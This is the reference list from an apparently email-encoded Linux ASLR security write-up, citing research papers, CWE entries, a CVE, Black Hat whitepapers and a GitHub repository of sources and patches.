Hector Marco-Gisbert, Ismael Ripoll-Ripoll. ASLR-NG: ASLR Next Generation. =
2016=20
https://cybersecurity.upv.es/solutions/aslr-ng/ASLRNG-BH-white-paper.pdf=20

Julian Kirsch, Bruno Bierbaumer, Thomas Kittel and Claudia Eckert Dynamic=20
Loader Oriented Programming on Linux. 2017
https://github.com/kirschju/wiedergaenger/blob/master/kirsch-roots-2017-pap=
er.pdf=20

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
V. References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

	1. https://lkml.org/lkml/2012/11/5/673
	2. https://cwe.mitre.org/data/definitions/119.html
	3. https://cwe.mitre.org/data/definitions/190.html
	4. https://cwe.mitre.org/data/definitions/120.html
	5. https://cwe.mitre.org/data/definitions/704.html
	6. https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html
	7. https://www.cvedetails.com/cve/CVE-2014-9427/
	8. https://source.android.com/security/enhancements/enhancements70
	9. https://android-review.googlesource.com/c/platform/bionic/+/178130/2
	10. http://gcc.gnu.org/onlinedocs/gcc-3.3/gcc/Thread-Local.html
	11. http://www.phrack.org/issues/49/14.html#article
	12.=20
http://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-=
2009-Fritsch-Buffer-Overflows-Linux-whitepaper.pdf
	13. https://crypto.stanford.edu/cs155old/cs155-spring05/litch.pdf
	14.=20
https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-=
Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.=
pdf
	15. https://cwe.mitre.org/data/definitions/416.html
	16. http://www.skyfree.org/linux/references/ELF_Format.pdf
	17. https://lwn.net/Articles/741335/
	18. https://cwe.mitre.org/data/definitions/457.html
	19. http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-technique=
s.html

  All sources and patches could be found at https://github.com/blackzert/as=
lur=20
repo.

